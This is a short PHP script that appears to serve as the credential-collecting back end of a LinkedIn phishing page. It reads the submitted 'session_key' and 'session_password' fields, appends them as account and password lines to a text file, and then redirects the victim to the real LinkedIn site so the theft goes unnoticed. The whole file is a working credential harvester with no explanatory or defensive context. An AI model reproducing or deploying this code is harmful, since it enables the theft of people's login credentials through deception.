<?php

file_put_contents("usernames.txt", "Account: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://linkedin.com');
exit();
